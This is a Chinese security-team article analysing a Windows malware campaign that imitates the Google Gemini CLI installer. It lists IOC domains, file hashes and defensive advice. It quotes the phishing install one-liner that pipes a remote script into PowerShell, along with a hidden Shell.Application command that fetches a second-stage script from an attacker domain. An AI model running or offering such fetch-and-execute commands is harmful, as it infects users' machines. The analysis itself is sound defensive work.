---
title: 伪装成 Google Gemini CLI 的新型 Windows 恶意软件攻击活动分析
url: https://mp.weixin.qq.com/s/WJF0n601BGOonfD1vTxcTg
source: Doonsec's feed
date: 2026-05-16
fetch_date: 2026-05-17T05:44:39.636902
---

# 伪装成 Google Gemini CLI 的新型 Windows 恶意软件攻击活动分析

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/J7CSmJcRR8mJ9AYxSqOPVkoHoeZdZsKrvOrxMGVXcNVxnQsDWUGoAx0AqAotSwich4ugF0CXDaGapdzHQf3CvJNicS1DvjrdOkvZwLHC2VYks/0?wx_fmt=jpeg)

# 伪装成 Google Gemini CLI 的新型 Windows 恶意软件攻击活动分析

原创

忍者
忍者

Khan安全团队

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

近期，针对 Windows 平台的恶意软件攻击活动出现新动向，攻击者通过**仿冒 Google Gemini CLI 官方工具**的方式，诱导技术用户执行恶意 PowerShell 脚本，实现多阶段载荷投递与系统入侵。该攻击精准面向开发者、运维人员等高频使用命令行工具的群体，隐蔽性与欺骗性较强。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/J7CSmJcRR8mXI0W3xGJgjpb6vGU7xniaEukQ8EgNGtVlPXrFlmShjo6fXrVhK2lfGrnKdBs8TmQnMsQJBz7qX5zpdTIicRpRenUgHLpsZjgqI/640?wx_fmt=png&from=appmsg)

## 一、攻击概况

##

攻击者搭建仿冒 Gemini CLI 的钓鱼网站，以 “官方 CLI 安装工具” 为幌子，诱导用户直接在终端执行远程下载命令。受害主机执行脚本后，会在后台静默加载多级恶意载荷，持续从多个恶意域名拉取后续程序，最终完成入侵行为。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/J7CSmJcRR8nibhXQ5saEMNMeNxCPeMzy208Xia8TUAHCQYV5pOBDOxlWuXzD5JibkeahSXkHW8KEShPPTp9atzR4BVoiaIWRgAaKENczywUsaNc/640?wx_fmt=png&from=appmsg)

本次样本相关动态分析沙箱链接

https://app.any.run/tasks/b5be817c-56c5-4b88-aa1a-d5b5380a032f

## 二、攻击流程

##

**钓鱼站点诱导**攻击者使用仿冒域名搭建与 Gemini CLI 高度相似的页面，提供伪装成 “官方一键安装” 的 PowerShell 指令，诱使用户直接运行。

![](https://mmbiz.qpic.cn/mmbiz_png/J7CSmJcRR8k8950A9xaqfgC6hTgHeichSfyhLBaqMRx7RJhIDOJxQ9hFnaHUxUk2HVFV2JaFpMDI1FwSSsjGOs5BBvicsSEkfJytTKQvfufEI/640?wx_fmt=png&from=appmsg)

* 页面标题、Logo、功能描述均模仿真实 Gemini CLI 项目，使用 “Build, debug & deploy with AI” 等话术吸引开发者与技术人员。
* 提供伪装的安装命令：`powershell -c "irm gemini-setup.com/install.ps1 | iex"`，诱导用户在终端直接执行，利用 PowerShell 的远程下载与执行特性（`irm | iex`）实现初始感染。

**执行初始恶意脚本**用户执行命令后，系统会从钓鱼站点下载并执行首个 PowerShell 脚本，该脚本表面伪装正常安装流程，暗中启动隐藏的恶意行为。

```
$GeminiObj = New-Object -ComObject "Shell.Application";$GeminiObj.ShellExecute("powershell", '"irm events.msft23.com | iex"', $null, "open", 0);
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/J7CSmJcRR8ntBVrnWjicMy6U2aUl0ohBZb7zMAMBtRFn9YnYKpWQXAibWsB3HZ2zOwQPYvUgr87ozkeLmt5BeDguE1M9b5nrEHicIewib3hEbeA/640?wx_fmt=png&from=appmsg)

多级载荷投递初始脚本执行后，继续从其他恶意域名拉取第二阶段、第三阶段载荷，通过混淆代码、隐藏执行等方式规避安全工具检测。

驻留与后续攻击最终载荷落地后，攻击者可实现信息窃取、远程控制、持久化驻留或进一步投放其他恶意程序。

## 三、关键恶意 IOC 指标

##

| 域名 | 用途 |
| --- | --- |
| `geminicli.co.com` | 钓鱼站点，初始诱导 |
| `gemini-setup.com` | 钓鱼站点，托管 `install.ps1` |
| `events.msft23.com` | 第二阶段脚本加载，混淆代码载体 |
| `mo2307.com` | 最终 payload 投递 |

###

### 文件 SHA256 哈希

* 5071921cb1ca369fe8f7af522a00373c8c85e4357f7ea1879d2cb4ae791797d6
* c47610c9df3fb101b0e99f2ac12589db653464edf12cebaa2c67fd33fc7715f3
* ae8f70dad97fedecd707977ca22fd6f656c64c0dac96e03f0f4a6c04d0693f59
* 27e17661f5573f63b65e3a5cfe5bdca75acdc1911441b032781f7ebe125d9194

## 四、典型行为特征

##

* 利用 PowerShell 远程下载执行：irm | iex 一类指令
* 使用 Shell.Application COM 对象隐藏执行后台命令
* 多级域名接力投递载荷，增加检测难度
* 针对开发者群体，伪装 AI 开发工具，社会工程学欺骗性强

## 五、安全建议

##

1. 安装命令行工具、开发包时，**只从官方 GitHub、官方 npm/pip 等渠道获取**，不随意执行陌生网站一键脚本。
2. 企业可在边界设备封禁文中所列恶意域名，防止内网主机主动外联。
3. 终端 EDR 重点监控 PowerShell 隐藏执行、远程下载执行等异常行为。
4. 若发现主机执行过可疑脚本，立即隔离并进行全盘查杀，检查是否存在持久化项。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV3JwGBDpU6XB9v8QmVNuqicT4vSSnibBesxWSwrwSORopnXEPcjahRUcLrTDK5MszhYG4ho8icFMuXMg/0?wx_fmt=png)

Khan安全团队

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV3JwGBDpU6XB9v8QmVNuqicT4vSSnibBesxWSwrwSORopnXEPcjahRUcLrTDK5MszhYG4ho8icFMuXMg/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过